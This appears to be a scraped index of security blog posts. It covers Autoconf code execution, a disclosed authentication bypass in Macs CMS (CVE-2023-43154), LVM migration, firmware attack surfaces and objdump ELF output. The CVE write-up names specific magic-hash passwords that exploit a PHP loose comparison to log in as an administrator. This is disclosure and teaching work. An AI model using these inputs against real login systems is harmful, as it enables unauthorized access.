foreseeable future, making it an even more attractive attack vector for adversaries.\nIn fact, the manner in which this functionality is built-in is reminiscent of attack techniques displayed in GTFObins, which are often used for privilege escalation.\nConclusion The ability to run commands from Autoconf is a feature, not a bug. However, it is a feature that can be abused in a way that very few people are aware of. And when exploited strategically, this can lead to the infection or damage of thousands of devices.\nI hope that in writing this, I was able to bring awareness to open-source users on the potential dangers of configuring untrusted applications. If you have any questions, concerns, or criticisms on this article, feel free to message me on LinkedIn and I will be happy to discuss them with you.\nThanks for reading!\n","permalink":"https://ally-petitt.com/en/posts/2023-12-02_stealthy-exploit-opens-door-for-pre-compilation-code-execution-17a57b9585cb/","summary":"https://img.rasset.ie/001babea-1600.jpg\nIntroduction Linux users often take pride in their ability to compile their own code. In spite of this, a subtle yet critical attack vector has existed for over 20 years with high potential impact when exploited. Cleverly disguised within the configure.ac file, this attack vector allows malicious actors to execute code on your system before the compilation process even begins.\nWhile the absence of known exploits may lull users into a false sense of security, it is precisely this lack of awareness that makes this attack vector dangerous, increasing the chances of successful and large-scale exploitation.","title":"Stealthy Exploit Opens Door for Pre-Compilation Code Execution"},{"content":" https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIntroduction Discovering a CVE was always an idea that enticed me, but I had no idea how to achieve it. Encountering the authentication bypass that I will explain in this article was both unexpected and deeply inspiring. In my preparation for the OSWE, I decided to practice identifying the exam vulnerabilities in real, open-source applications, which would both give me practice for the exam and enable me to contribute to the security community. The first of these applications is the subject of this article.\nPrerequisite Knowledge A basic understanding of scripting languages and web applications Setup I decided to audit Macs Framework v1.14f. The reasoning behind this target choice is that I wanted to gain familiarity with analyzing large code bases before challenging myself with a more modern target in order to establish a robust methodology. Additionally, Macs CMS seemed like a target that was compatible with the machines used in the OSWE certification exams and the additional preparation would increase my chance of passing on the first attempt.\nMy first attempt to launch the web application locally was unsuccessful. I was unable to install the deprecated PHP5 version on my host OS. As a solution, I decided to run the application in a Docker container. I made a Dockerfile in the Application/ folder of the source code. I was unable to find documentation or online resources as to the process of configuring this CMS, so after some tweaking, I composed the following Dockerfile:\nFROM php:5.6-apache COPY . /var/www/html/ WORKDIR /var/www/html # add working apt sources RUN echo deb http://archive.debian.org/debian/ stretch main \u0026gt; /etc/apt/sources.list RUN echo deb http://archive.debian.org/debian-security/ stretch/updates main \u0026gt;\u0026gt; /etc/apt/sources.list # install mysql RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y mysql-server \u0026amp;\u0026amp; \\ apt-get clean # remove symlinks on error logs RUN unlink /var/log/apache2/error.log \u0026amp;\u0026amp; \\ unlink /var/log/apache2/access.log # remove .htaccess file because it isn\u0026#39;t needed and it caused issues RUN rm /var/www/html/.htaccess # change ownership of web files to www-data RUN chown www-data /var/www/html -R \u0026amp;\u0026amp; \\ chmod 755 /var/www/html -R # start mysql and apache2 RUN service mysql restart RUN service apache2 restart I then built the new image and ran it as a container named macs-cms.\ncd Macs-CMS/Application sudo docker build -t macs-cms . sudo docker run -it -exec --name macs-cms macs-cms /bin/bash After these commands were complete, I was able to visit the live CMS at \u0026lt;http://172.17.0.2\u0026gt;.\nFinding CVE-2023–43154 My first encounter with the source code aimed to identify key metadata that would provide context as to which vulnerabilities to look for. By briefly browsing the project in VSCodium’s project explorer and running enumeration commands on the Docker container, I was able to deduce the following information:\nProgramming language: PHP 5.6 Architecture: Model-View-Controller (MVC) Routes: Organized with the following pattern: /\u0026lt;controller_name\u0026gt;/\u0026lt;function\u0026gt; Database: MariaDB 10.1.48 Operating System: Debian GNU/Linux 9 Informed on the technology stack, I was able to focus my research on vulnerabilities that are common in PHP and MariaDB, one of which being PHP type confusion.\nI proceeded with navigating the web application and monitoring my HTTP traffic through my BurpSuite web proxy while taking notes on details that I deemed interesting for future vulnerability analysis. In particular, I honed in on the authentication functionality because of its potential to be high severity.\nUpon my login attempt as admin, I noticed the following traffic:\nIntercepted login request\nThe URI, excluding the prefix index.php, was /main/cms/login. My interpretation of this route is that the mainController is initially called, which loads to the CMS plugin with $this-\u0026gt;cms = $this-\u0026gt;loadPlugin('CMS');. Then, the login() function is invoked within the CMS plugin with access to the HTTP POST data, which is globally accessible.\nI visit the login() function within the CMS plugin located at plugins/CMS/controllers/CMS.php to discover that in order for the user to log in successfully, they must already be logged in as admin or the method isValidLogin() must return true.\nSince the return value of the function shown above must the true and the value returned is stored in the variable $loggedIn, I annotated the occurrences of $loggedIn to highlight the execution flow that must be triggered in order to achieve the intended return value. From here, I began to work backwards.\nFor $loggedIn to be set to true, a conditional statement must be met. Luckily, I noticed that a loose comparison was being made for both of the comparisons that can lead to the value being set to true. This article will not be covering PHP loose comparison vulnerabilities in-depth, however, I will give a high-level overview of the relevant details of loose comparison and more detail can be found at this resource.\nLoose Comparison Logic In PHP, loose comparisons refer to the use of two equal signs (==). This differs from a strict comparison (===) in the way that two operands are compared. A loose comparison will attempt to interpret the operands and, if deemed applicable, convert them to a data type that allows for improved compatibility between them.\nThe following example illustrates the difference between a strict and loose comparison in PHP. I make two comparisons between the string “0e3264578” and the integer 0. The first is a loose comparison and the second is strict. The result of the comparison between the string and integer then outputs whether the comparison returned true or false.\n\u0026lt;?php if (\u0026#34;0e3264578\u0026#34; == 0) { echo \u0026#34;Loose comparison returns True\\n\u0026#34;; } else { echo \u0026#34;Loose comparison returns False\\n\u0026#34;; }; if (\u0026#34;0e3264578\u0026#34; === 0) { echo \u0026#34;Strict comparison returns True\u0026#34;; } else { echo \u0026#34;Strict comparison returns False\u0026#34;; }; ?\u0026gt; I save the above program as test-comparison.php and execute the code to discover that the first, loose comparison returned true and the second, strict comparison returned false.\nTo understand why this is the case, it is important to understand what PHP is doing during a loose comparison like the one in this example. An integer followed by the letter e and additional digits is interpreted by PHP as an integer raised to an exponential power. In this case, “0e3264578” was interpreted as 0 raised to the 3264578 power. Of course, 0³²⁶⁴⁵⁷⁸ is equal to 0, hence the return value of true when comparing “0e3264578” to 0.\nThis did not return true in the strict comparison because PHP was not interpreting the string as an integer like it was in the loose comparison. It took the operands for their literal value, which was a string and an integer of different values, which are not the same.\nThis can be abused in the context of a login form where two password hashes that are both 0-like such as “0e123” and “0e345” can be loosely compared and result in a true outcome since 0¹²³ and 0³⁴⁵ both equal the same thing: 0. As a result, PHP would signal that the hashes are equivalent, allowing for a successful login, when they are not.\nFormulating the Exploit To exploit this vulnerability, I needed to fully understand what the input in isValidLogin() consists of. It is evident in the login() function that there is manipulation done on the received password before it is passed to the isValidLogin() function for comparison with previously stored credentials.\nRevisiting the initial function call, it appears that the user-controlled parameter password is being passed through an additional method called encrypt() before being passed to isValidLogin().\n$this-\u0026gt;isValidLogin(Post::getByKey(\u0026#39;username\u0026#39;), $this-\u0026gt;encrypt(Post::getByKey(\u0026#39;password\u0026#39;)) ) Visiting this function reveals that it simply returns an unsalted MD5 hash of the parameter passed into it, in this case, password.\nI did more digging to uncover that the password saved in the database was also hashed. This means that in the isValidLogin() function, the password comparison is made between two MD5 hashes like the following:\n$account[\u0026#39;password\u0026#39;] == $password // -\u0026gt; md5(user\\_inputted\\_password) == stored\\_md5\\_password\\_hash As explained before, in PHP, “0e123..” will be interpreted as 0 in a loose comparison. Hashes that follow this format (0e followed by digits) are known as magic hashes. Theoretically, if we were to compare two magic hashes together, the result would be true and the $loggedIn variable would subsequently be set to true and returned to the login() function resulting in a success authentication.\nI will first verify this with a sample PHP script that compares two different zero-like strings.\n\u0026lt;?php if (\u0026#34;0e123123123\u0026#34; == \u0026#34;0e456456456\u0026#34;) { echo \u0026#34;Comparison returns True\\n\u0026#34;; } else { echo \u0026#34;Comparison returns False\\n\u0026#34;; }; ?\u0026gt; As expected, executing the script results in a true comparison.\nNow, all that is left to do is reproduce this in the CMS application. Using my cheat sheet of magic hashes, I identify two magic hashes to use:\nfh70QgaGIfYM:0e564472166873750526572156675923 hello10672785079:0e859173238273273455651853557908 I create an test user called test-admin with the first password fh70QgaGIfYM. The intercepted request can be seen in BurpSuite on the right.\nFinally, for the moment of truth, I log out of my admin account and try to log in with the second password hello10672785079. The resulting request is shown below.\nThe intercepted response of my login attempt returns a status code of 200 and redirects me to the home page, indicating a successful login.\nWith my new administrator privileges, I can change configuration information about the site including the password of the other administrator.\nConclusion I was able to log in to an administrator account using one of many incorrect passwords that work to bypass authentication. This opened the door to potential breaches in confidentiality, integrity, and availability.\nAs stated in my original PoC, there are limitations to this since the admin password hash must already be a 0-like string in PHP and the username must be previously known, 0-like, or easy to guess. The username can be enumerated on the platform through other means, so this is not as big of an issue.\nThank you to everyone who read this far and I hope that you found value in this article!\n","permalink":"https://ally-petitt.com/en/posts/2023-09-29_how-i-found-authentication-bypass-vulnerability---cve-2023-43154-b55dee7c876b/","summary":"https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIntroduction Discovering a CVE was always an idea that enticed me, but I had no idea how to achieve it. Encountering the authentication bypass that I will explain in this article was both unexpected and deeply inspiring. In my preparation for the OSWE, I decided to practice identifying the exam vulnerabilities in real, open-source applications, which would both give me practice for the exam and enable me to contribute to the security community.","title":"How I Found an Authentication Bypass Vulnerability — CVE-2023–43154"},{"content":" Introduction This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.\nScenario: You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.\nAs implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.\nWarning: This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.\nBenefits of LVM The full scope of LVMs capabilities can be seen here. It is a flexible utility that offers unique advantages over traditional physical partitions:\nGrouping multiple drives into a single volume group Support for thin provisioning Snapshot capabilities that can be used for backups Easy to resize partitions and add/remove drives More detail on the benefits can be found here. We are now ready to discuss the steps to convert to LVM.\nSteps to Safely Convert to LVM For the purpose of this article, the primary storage device used will be referred to as sda and the new storage device will be called sdb. An overview of the plan is the following:\nCreate LVM group on sdb Copy data from sdapartitions to sdb logical partitions Expand LVM group on sdb to include unused sda partitions Prerequisite Install the LVM tools and rsync with the command that is appropriate with your Linux distribution.\nsudo apt-get install lvm2 rsync # For Ubuntu/Debian sudo pacman -Sy lvm2 rsync # Arch Linux Create LVM group on sdb Create a volume group called myvg on sdb.\n$ sudo pvcreate /dev/sdb $ sudo vgcreate myvg /dev/sdb Create a logical volume Create a logical volume on the myvg volume group to store the new data in. This one is named backup.\n$ sudo lvcreate -n backup -L 300G myvg To verify your progress, you can run the commands sudo vgs and sudo lvs to list the recently created volume groups and logical volumes.\nMount the new logical volume Create a filesystem. For quick creation, just press the Enter key for each of the prompts.\nsudo mkfs.ext4 /dev/myvg/backup Then, create a mount point and mount the backup logical volume to it.\nsudo mkdir /mnt/backup sudo mount /dev/myvg/backup /mnt/backup Copy data to the logical volume Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer sda3 onto backup so I will use the following command:\nsudo mount /dev/sda3 /mnt/root In this case, rsync will be used to transfer the files from sda to sdb. In this case, the 500GB portion of sdb that was used to create the backup logical volume. After, I will unmount the logical volume and physical partition.\nsudo rsync -av /mnt/root /mnt/backup sudo umount /mnt/backup sudo umount /dev/root Repeat steps 2–4 with all of the partitions that you with to preserve.\nExpand the LVM volumes Now, we will add sda2 and sda3 into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.\nsudo pvcreate /dev/sdY sudo vgextend myvg /dev/sdY Add new partitions to fstab Finally, find the UUIDs of the new logical volumes with lsblk -f and add those to your /etc/fstab with the following syntax:\nUUID=\u0026lt;your-home-uuid\u0026gt; /home ext4 rw,relatime 0 2 UUID=\u0026lt;your-root-uuid\u0026gt; / ext4 rw,relatime 0 1 As always, make changes to the above configuration option if necessary.\nConclusion These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.\n","permalink":"https://ally-petitt.com/en/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/","summary":"Introduction This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.\nScenario: You have a hard drive with all your files on it that uses physical partitions.","title":"How to safely convert to LVM without losing your data"},{"content":" Introduction Firmware is a critical component of electronic devices. It is the program that is installed on embedded systems that defines their functionality. Firmware is responsible for initializing the hardware components as the computer boots up, enabling the device to function properly.\nAttacks against firmware have been of increasing interest to hackers due to their relative ease to exploit in a world of increasingly more secure application- and network-layer security practices. Firmware security has been a frequently overlooked attack surface in cybersecurity that is now relatively unprotected in comparison to other attack vectors such as web applications or operating systems.\nIn addition, security mitigations such as performing firmware updates are often more costly and inconvenient as they may require updating other software and firmware dependencies on the system, leading to more downtime. In some environments such as hospitals, firmware must pass very strict regulations which can increase the time it takes for updates. Compatibility between the firmware and hardware can result in an additional barrier for firmware updates.\nThe Rise of Firmware Attacks Firmware attacks are quickly becoming more common. According to Microsoft, 80% of organizations between the years 2019 and 2021 were victims to at least 1 firmware attack. In many cases, firmware is a single point of failure in the devices of organizations. The privileged nature of firmware allows for it to be abused by cybercriminals to access information such as cryptographic keys in memory, the BIOS/UEFI memory, network traffic, and potentially data from peripheral devices such as SSDs or webcams.\nThese are some of the techniques used by adversaries once they have obtained firmware-level access:\nDisable security settings such as Secure Boot (BlackLotus) Modify the boot record of the system to contain a bootkit Wipe the boot record resulting in a bricked system Arbitrarily read secrets and other sensitive data from memory Attack Surface Attacking firmware can lead to extremely privileged access to a system. For instance, Baseboard Management Controllers (BMCs), Unified Extensible Firmware Interface (UEFI), System Management Mode (SMMs), or management subsystems on the CPU can each be compromised. This section will outline each component’s purpose, security risk, and mitigation techniques.\nBMCs Baseboard Management Controllers (BMCs) are hardware components that are often soldered into the motherboard of enterprise-grade servers. They may be assigned different names depending on the model that is used. For instance, Dell’s high end PowerEdge servers refer to the BMC as iDRAC (Dell Remote Access Controller) and HP has their infamous iLO (integrated Lights Out) which, as the name implies, provides out-of-band remote management services for the server that allow it to run in a lights out data center with minimal physical interaction.\nThe role of BMCs is to allow remote management of the server. This includes power management, which is the ability to turn the server off and on, and the ability to configure UEFI settings. They often include a built-in keyboard video mouse (KVM) functionality that allows out-of-band access to the display of the server and allows for direct interaction with it through a keyboard and mouse.\nBMCs are highly privileged components that may be abused for\nData theft and exfiltration Malware installation Disabling security features such as Secure Boot Physical damage to the system caused by sending it a signal that increases the voltage to the CPU causing it to overheat Another attack might include incessant rebooting of the system, rendering it temporarily useless and leading to a loss of availability.\nMitigation\nBMC attacks can be mitigated through the following techniques:\nEstablishing unique user accounts (if possible) and setting a strong password- ideally one that is in line with NIST’s password guidelines Enforcing secure network practices such as not exposing the BMC to the internet and implementing VLAN separation Use firmware scanning tools to verify the integrity of the firmware and catch security misconfigurations Monitoring BMC integrity through an established root of trust (RoT) such as a TPM or secure enclave in the CPU UEFI/BIOS Picture of a BIOS screen\nThe Unified Extensible Firmware Interface (UEFI) is the modern and prevalent successor to the Basic Input Output System (BIOS).\nWith access to the UEFI, attackers can\nWipe the UEFI — the resulting hardware would need to be sent back to the hardware to be flashed with the correct firmware again Firmware modification Bootkit installation Physical damage to the system An infamous example of malware that attacks the UEFI is BlackLotus, a bootkit that abused CVE-2022–21894 to truncate the SecureBoot policy from memory via the Windows Boot Application, thereby fully bypassing the security measure. Malware with the level of access granted by the UEFI can result in expensive damages to enterprise systems.\nSMMs https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2020/11/SMM-social-2.png\nThe System Management Mode (SMM) is a highly privileged operating mode that is often referred to as Ring -2. The primary benefit of SMM is that it offers a distinct processor environment that is meant for use by only the UEFI/BIOS. The SMM code is executed in its own isolated address space known as SMRAM that is inaccessible to other privilege levels. This isolation is enforced by firmware.\nWhen System Manager Interrupts (SMIs) are issued during runtime, they interrupt the current execution of the CPU and transfer control to the SMI Handler, which is a software routine stored in the firmware that is responsible for handling and processing these interrupts. SMIs are how the UEFI interacts with the SMM.\nSMMs can be abused to\nImplant rootkits and bootkits on a system Read sensitive data Maintain persistence and stealth Mitigation\nMitigations for SMM attacks can include keeping the firmware updated and using security mechanisms such as Data Execution Prevention (DEP) and Control-Flow Integrity (CFI) on compiled binaries to protect from memory-based attacks.\nManagement Subsystems https://freundschafter.com/wp-content/uploads/2018/01/7254-f-4-bc8a6355cce759c3.png\nIntel’s Management Engine (ME) or AMD’s Platform Security Processor (PSP) are standalone microcontroller components that allow for out-of-band, remote management of a computer. They are included in the chipsets of these CPUs and, as explained in this article, the ME of an Intel chip in particular has a separated connection from the internal Interconnect, means it has the capabilities to bypass other subsystems like TPM and SMBus.\nThe ME contains the Intel Active Management Technology (AMT). The AMT provides the remote management and control capabilities for Intel-based computers and servers, even when the system is powered off or the operating system is not running. It is a service that is enabled by the hardware microcontroller that is referred to as the ME.\nDespite ME and BMCs having a similar functionality, BMCs are not implemented into the same variety and scale of devices as the management engine is. This can significantly increase the impact of an ME vulnerability.\nWell known vulnerabilities in the ME include CVE-2018–3627 and CVE-2020–8703 which can lead to arbitrary code execution and local privilege escalation respectively.\nMitigation\nKeeping the software of the CPU updated is crucial for mitigation. The updates can contain patches for known security vulnerabilities on the ME of the chip. In particular, updating the CSME, AMT, I ISM, DAL and DAL Software can prevent vulnerabilities as well as securely configuring the management engine if possible.\nSupply Chain Attacks https://www.enisa.europa.eu/news/enisa-news/understanding-the-increase-in-supply-chain-security-attacks/@@download/image/IncidentReporting-PR_423x300mm_01.png\nAttacking the supply chain can involve tampering with the firmware or hardware at any stage in the supply chain including development, manufacturing, distribution, and updating or patching the system. The result can be widely distributed malware affecting countless systems.\nIn addition to the aforementioned tampering, firmware often uses 3rd-party dependencies (e.g. OpenSSL) which can remain outdated even when included in the latest firmware version. The result is a discrepancy between the firmware and its dependencies which never received an update, despite having critical security vulnerabilities.\nOne method used to manage supply chain dependencies is using a Software Bill of Materials (SBOM). This is a list of the software components that are implemented into a firmware component. The accuracy and integrity of these lists are crucial to ensure that the known vulnerabilities in the firmware’s dependencies can be identified. There are also commercial solutions that monitor the firmware’s activity and integrity in order to raise alerts when suspicious hallmarks of infected firmware are detected.\nMalware Attacks Another way that firmware can be exploited is through a system that has already been infected. This may happen through social engineering, executing a malicious program, exploiting vulnerabilities in externally facing service, drive-by attacks, and other initial access methods identified by the MITRE ATT\u0026amp;CK framework.\nWith this attack type, the malicious actor or malware will attempt to elevate their privileges to the highest possible level and use tools such as RWEverything to write to the drivers and firmware. Through this approach, attackers are still able to obtain the privileged access of and stealth granted through firmware-level access.\nFirmware Attacks in the Wild It has become increasingly more prevalent for adversaries to gain their initial foothold on a network through remote access products. In 2020 alone, Checkpoint’s annual cybersecurity report found a substantial increases ranging from 85% to 2,066% of attacks that exploit vulnerabilities in these products as shown in the image below.\nPage 25 of Checkpoint’s 2021 cybersecurity report\nMany of these vulnerabilities are caused by insecure firmware. Examples of this in insecure VPN products are Zyxel’s CVE-2023–33009 and CVE-2023–33010 and Fortinet’s CVE-2023–27997. Both are critical RCEs caused by a buffer overflow that can lead to unauthorized, highly privileged access to a device. This can then be abused to implant malware such as a bootkit or make other critical configuration changes to the system and to move laterally through the internal network.\nMitigations Security Platforms Firmware security platforms such as those offered by Binarly and Eclypsium can help to detect and mitigate firmware misconfigurations and vulnerabilities. Binarly relies primarily on AI and deep code inspection to detect known and unknown vulnerabilities and misconfigurations in firmware. Eclypsium’s approach appears to incorporate both crytographic and heuristic verification of firmware with continuous monitoring, although the exact approach of both of these solutions is unknown.\nIn addition, Lenovo launched their ThinkShield earlier this week, which is also powered by Eclypsium. A testament to the increase in availability of commercial solutions in firmware and supply chain security.\nCode Signing Solutions that use cryptographic signatures to verify the integrity of code can also be used to mitigate supply chain attacks. Unforeseen malware being added to production code, for instance, can be prevented since the changes after the program was signed would be easier to detect.\nFor instance, Sigstore is an open source project that at a high level uses Public Key Infrastructure (PKI) in order to validate the integrity of different modules in the supply chain to ensure that they were not tampered with. It does this by using a Sigstore client such as Cosign to request a public and private key from the certificate authority Fulcio. The private key that was obtained is used with Cosign to sign the file or image to be verified. After the artifact is signed, the signature of the file, its digest, and public key are stored in Rekor, an append-only transparency ledger that is viewable by the public. The private key is then deleted automatically, removing the need for key management. This system allows for developers, security professionals, and end users to verify that the file they have has not been tampered with.\nIt is worth noting, however, that while code signing will verify integrity, it does not guarantee that the Software Bill of Materials (SBOM) is fully accurate in its content and completeness in closed-source projects. The security implication is potential lack of transparency on 3rd-party dependencies in these projects leading to unpatched security vulnerabilities in the system.\nInitiatives While firmware attacks are on the rise, there is hope to be found in the initiatives that have been enacted in order to fortify this section of cybersecurity.\nIncreased Firmware Publications There has been a rising awareness of firmware security that can be attributed largely to the increased amount of publications in circulation. These may include security best practices, vulnerability disclosures, or news articles.\nIn June of this year, the Cybersecurity \u0026amp; Infrastructure Security Agency (CISA) and the National Security Agency (NSA) collaborated to create a guide for hardening baseboard management controllers. This document outlined best practices for securing BMCs including many of the techniques that were mentioned previously in this article.\nSSITH In 2017, Defense Advanced Research Projects Agency (DARPA) created their System Security Integration Through Hardware and Firmware (SSITH) program which takes a proactive approach to low-level security.\nSSITH is focusing specifically on common classes of hardware weaknesses as identified by the MITRE Common Weakness Enumeration Specification (CWE) and NIST, including buffer errors; information leakage; resource management; numeric errors; injection; permissions, privileges, and access control; and hardware/system-on-chip implementation errors. Researchers are exploring a number of different approaches that go well beyond patching. These include using metadata tagging to detect unauthorized system access; utilizing context sensing pipelines to determine the intent of instructions; and employing formal methods to reason about integrated circuit systems and guarantee the accuracy of security characteristics.\nDr. Lok Yan Although it does have a predominant focus on hardware, SSITH still recognizes the role of firmware as an essential component in addressing security challenges and preventing exploit.\nSSITH appears to be an ongoing program whose effects have not yet been released publicly.\nSecure Development Practices https://blog.gitguardian.com/content/images/2022/05/21W10-blog-content-stateOfReport-image2.jpg\nCybersecurity has gradually become a significant part of the development process of both software and firmware. More companies are making the shift to a Secure Software Development Lifecycle (SSDLC). With this model, security is a consideration from the conception of a program to its release.\nConclusion With firmware attacks on the rise and an increased reliance on digital devices, securing systems is an important step of preventing critical cyberattacks. Modern commercial solutions can help to monitor firmware configurations, activity, and supply chain vulnerabilities and the trend towards secure development and education can help to decrease the amount of vulnerabilities that are in the firmware to begin with. In spite of this, firmware will likely never reach a point of having zero vulnerabilities. Maintaining regular updates and continuous education on the latest research is imperative in safeguarding our digital ecosystems, fortifying devices against emerging threats, and fostering a resilient foundation for a secure and trustworthy technological future.\n","permalink":"https://ally-petitt.com/en/posts/2023-08-05_beyond-the-screen--the-hidden-world-of-firmware-security-87b0ea6a20a4/","summary":"Introduction Firmware is a critical component of electronic devices. It is the program that is installed on embedded systems that defines their functionality. Firmware is responsible for initializing the hardware components as the computer boots up, enabling the device to function properly.\nAttacks against firmware have been of increasing interest to hackers due to their relative ease to exploit in a world of increasingly more secure application- and network-layer security practices.","title":"Beyond the Screen: The Hidden World of Firmware Security"},{"content":"objdump is a command line tool that can be used to gain insight into an executable binary. In this article, the tool will be used to dump all of the headers of the ELF binary heapedit with the command below. Then, we will analyze and explain each section of output from the top to the bottom.\nobjdump -x ./heapedit Executable and Linkable Format (ELF) files are a common file format for object files, executable binaries, core dumps, and shared libraries. It provides a standardized format for storing executable and object code, symbol information, and other metadata necessary for proper software execution. It may be helpful to first get an overview of an ELF file structure which can be seen in this image:\nhttps://upload.wikimedia.org/wikipedia/commons/e/e4/ELF_Executable_and_Linkable_Format_diagram_by_Ange_Albertini.png\nFile Header The first segment of output displays information from the file header including its file format, architecture, and flags. I’ll sequentially describe what each section means.\nheapedit: file format elf64-x86-64 heapedit architecture: i386:x86-64, flags 0x00000112: EXEC\\_P, HAS\\_SYMS, D\\_PAGED start address 0x0000000000400720 file format- elf64-x86–64 refers to an ELF file that was designed for 64-bit systems and compiled for the x86–64 architecture. architecture- The architecture i386:x86–64 indicates that the program is compatible with the i386 and x86–64 architecture. flags 0x00000112- These flags are Binary File Descriptors (BFDs). They come from the binutils package which is built into objdump and their meaning can be found in the documentation here. In this example, EXEC_P means the program is directly executable, HAS_SYMS means that the program has a symbol table which helps with debugging, and D_PAGED means that the program’s memory is dynamically paged. start address- The memory address at which the .text section begins, which contains the assembly code of the program. This information is obtained by analyzing the raw bytes at the beginning of the file. The specifications for which bits correspond with which pieces of information can be seen here.\nProgram Headers The program header (Phdr) is a section that contains necessary information for executing the binary.\nProgram Header: PHDR off 0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3 filesz 0x00000000000001f8 memsz 0x00000000000001f8 flags r-- INTERP off 0x0000000000000238 vaddr 0x0000000000400238 paddr 0x0000000000400238 align 2**0 filesz 0x000000000000001c memsz 0x000000000000001c flags r-- LOAD off 0x0000000000000000 vaddr 0x0000000000400000 paddr 0x0000000000400000 align 2**21 filesz 0x0000000000000c98 memsz 0x0000000000000c98 flags r-x LOAD off 0x0000000000000e00 vaddr 0x0000000000600e00 paddr 0x0000000000600e00 align 2**21 filesz 0x0000000000000278 memsz 0x0000000000000288 flags rw- DYNAMIC off 0x0000000000000e10 vaddr 0x0000000000600e10 paddr 0x0000000000600e10 align 2**3 filesz 0x00000000000001e0 memsz 0x00000000000001e0 flags rw- NOTE off 0x0000000000000254 vaddr 0x0000000000400254 paddr 0x0000000000400254 align 2**2 filesz 0x0000000000000044 memsz 0x0000000000000044 flags r-- EH\\_FRAME off 0x0000000000000b58 vaddr 0x0000000000400b58 paddr 0x0000000000400b58 align 2**2 filesz 0x000000000000003c memsz 0x000000000000003c flags r-- STACK off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4 filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw- RELRO off 0x0000000000000e00 vaddr 0x0000000000600e00 paddr 0x0000000000600e00 align 2**0 filesz 0x0000000000000200 memsz 0x0000000000000200 flags r-- Referencing the ELF man page, the paraphrased meaning of the different program types (PTs) are below.\nPHDR- specifies the location and size of the program header table itself. INTERP- specifies the location and size of the program interpreter (dynamic linker) path. LOAD- specifies the location and size of a loadable segment in the binary. DYNAMIC- specifies the location and size of the dynamic linking information. NOTE: specifies the location and size of the ELF note segment (ElfN_Nhdr). EH_FRAME: specifies the location and size of the exception handling frame information. STACK: represents the stack segment, but in this case, it has a size of 0, indicating that it doesn’t occupy any space in the binary. RELRO: specifies the location and size of the Relocation Read-Only (RELRO) area. Each program type has its corresponding attributes:\noff- offset from beginning of file to first byte of the segment vaddr- the virtual address that the first byte of the segment resides in memory paddr- the physical memory address of the first byte of the segment if relevant filesz- holds the number of bytes of the file image of the segment memsz- holds the number of bytes of the memory image of hte segment flags- holds a bitmask of flags describing the read, write, and execute permissions of the segment. align- specifies the desired alignment of the segment or section in memory. It indicates the power of two that should be used as the alignment constraint. This table gives an overview of the different sections in memory and where they can be found.\nDynamic Section This section contains information about the dynamic linking and runtime symbol resolution of the program. This allows for external libraries to be loaded from disk into memory during the execution of the program.\nDynamic Section: NEEDED libc.so.6 RUNPATH ./ INIT 0x0000000000400650 FINI 0x0000000000400af4 INIT\\_ARRAY 0x0000000000600e00 INIT\\_ARRAYSZ 0x0000000000000008 FINI\\_ARRAY 0x0000000000600e08 FINI\\_ARRAYSZ 0x0000000000000008 GNU\\_HASH 0x0000000000400298 STRTAB 0x0000000000400410 SYMTAB 0x00000000004002c0 STRSZ 0x00000000000000a8 SYMENT 0x0000000000000018 DEBUG 0x0000000000000000 PLTGOT 0x0000000000601000 PLTRELSZ 0x00000000000000f0 PLTREL 0x0000000000000007 JMPREL 0x0000000000400560 RELA 0x0000000000400518 RELASZ 0x0000000000000048 RELAENT 0x0000000000000018 VERNEED 0x00000000004004d8 VERNEEDNUM 0x0000000000000001 VERSYM 0x00000000004004b8 In this example, the file libc.so.6 needs to be dynamically linked to the program. The ELF man page defines the meaning of the categories on the left column. The right column contains the memory address to store the sections indicated by the left column.\nFor example, the ELF man page defines PLTGOT:\nDT_PLTGOT Address of PLT and/or GOT\nIn the above code block, the address of the Procedure Linkage Table (PLT) and/or Global Offset Table (GOT) table would be stored at the memory address 0x0000000000601000 as shown by the fact that they are in the same row and the values correspond.\nVersion References This section lists the versions of the dynamically linked libraries that are required for the program to run.\nThese versions are determined by the linker and requiring them allows for the program to run properly since the library versions used will be compatible with the Application Binary Interface (ABI).\nVersion References: required from libc.so.6: 0x0d696917 0x00 04 GLIBC\\_2.7 0x0d696914 0x00 03 GLIBC\\_2.4 0x09691a75 0x00 02 GLIBC\\_2.2.5 In this example, the output indicates that the binary depends on 3 different GLIBC versions: 2.7, 2.4, and 2.2.5.\nSections This segment of output contains information about the memory location and names of various different sections of the program. This information is useful to the linker since it helps with symbol resolution, relocation to ensure that they reference the correct addresses in memory, and more such as pointing to the program’s initialization and finalization routines.\nSections: Idx Name Size VMA LMA File off Algn 0 .interp 0000001c 0000000000400238 0000000000400238 00000238 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA 1 .note.ABI-tag 00000020 0000000000400254 0000000000400254 00000254 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA 2 .note.gnu.build-id 00000024 0000000000400274 0000000000400274 00000274 2**2 CONTENTS, ALLOC, LOAD, READONLY, 